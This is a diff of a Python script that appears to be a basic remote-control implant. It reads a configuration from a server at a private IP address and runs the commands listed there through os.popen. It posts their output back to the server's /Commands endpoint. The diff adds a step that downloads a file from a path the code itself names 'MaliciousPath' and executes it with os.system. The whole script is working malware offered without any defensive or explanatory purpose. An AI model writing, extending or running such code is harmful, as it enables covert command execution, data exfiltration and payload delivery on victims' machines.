@@ -1,9 +1,8 @@
 import requests
 import json
 import sys, string, os
-#https://stackoverflow.com/questions/25707558/json-valueerror-expecting-property-name-line-1-column-2-char-1
 
-SERVERADDRESS = 'http://localhost'
+SERVERADDRESS = 'http://192.168.3.63'
 CONFIGURATIONPATH = '/Configuration'
 HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-01'}
 COMMANDSTOEXE = None
@@ -33,8 +32,7 @@ def conf():
     #print(json.dumps(conf))
     SERVERADDRESS = 'http://'+conf['Server']
     COMMANDSTOEXE = conf['Commands']
-    MALICIOUSURL = conf['MaliciousURL']
-
+    MALICIOUSURL = SERVERADDRESS+conf['MaliciousPath']
 
 def RunCommand(command):
     run = os.popen(command)
@@ -47,11 +45,11 @@ def PreperToSend(type,str):
     return j
 
 def DownloadFile(url):
-    file = url.split('/')[-1]
-    print(file)
-    r = requests.Session()
+    #file = url.split('/')[-1]+'.exe'
+    #r = requests.Session()
     # NOTE the stream=True parameter
-    r = r.get(url, stream=True)
+    r = requests.get(url, stream=True, headers=HEADERS)
+    file = r.headers['Filename']
     with open(file, 'wb') as f:
         for chunk in r.iter_content(chunk_size=1024):
             if chunk: # filter out keep-alive new chunks
@@ -66,12 +64,12 @@ def RunExeFile(file):
     os.system(file)
 
 conf()
-print(COMMANDSTOEXE)
 for command in COMMANDSTOEXE:
     HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))
+RunExeFile(DownloadFile(MALICIOUSURL))
 #print(loadJson(PreperToSend('systeminfo',RunCommand('systeminfo'))))
 
-#file = DownloadFile('https://www.w3schools.com/html/pic_trulli.jpg')
+#RunExeFile(DownloadFile('https://www.w3schools.com/html/pic_trulli.jpg'))
 
 #HttpPostRequest(SERVERADDRESS,'/systeminfo',(PreperToSend('systeminfo',RunCommand('systeminfo'))))
 
